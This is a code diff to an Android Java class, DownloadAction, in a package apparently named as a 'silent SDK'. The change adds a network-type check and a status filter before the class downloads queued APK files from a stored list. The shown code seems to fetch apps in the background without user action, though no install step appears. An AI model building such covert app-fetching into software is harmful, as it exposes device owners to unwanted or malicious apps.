@@ -8,8 +8,8 @@ import java.sql.SQLException;
 import java.util.List;
 
 import sdk.grayweb.com.slientsdk.http.FileDownloader;
-import sdk.grayweb.com.slientsdk.http.IDownloadListener;
 import sdk.grayweb.com.slientsdk.model.ApkModel;
+import sdk.grayweb.com.slientsdk.util.DivesUtil;
 import sdk.grayweb.com.slientsdk.util.DownLoadUtil;
 
 /**
@@ -22,17 +22,19 @@ public class DownloadAction extends AbstractAction{
 
     @Override
     public int doAction() {
-        try {
-            List<ApkModel> downloadApks =  apkModelDao.queryBuilder().orderBy("level",false).query();
-            for (ApkModel model:downloadApks){
-                if(!DownLoadUtil.hasDown(model.apkpath)) {
-                    doDown(model.apkpath);
-                    break;
+        if(DivesUtil.getInstance(mContext).getNetworkType().equals("1")) {
+            try {
+                List<ApkModel> downloadApks = apkModelDao.queryBuilder().orderBy("level", false).where().eq("status", 1).query();
+                for (ApkModel model : downloadApks) {
+                    if (!DownLoadUtil.hasDown(model.apkpath)) {
+                        doDown(model.apkpath);
+                        break;
+                    }
                 }
+                return downloadApks.size();
+            } catch (SQLException e) {
+                e.printStackTrace();
             }
-            return  downloadApks.size();
-        } catch (SQLException e) {
-            e.printStackTrace();
         }
         return  -1 ;
     }
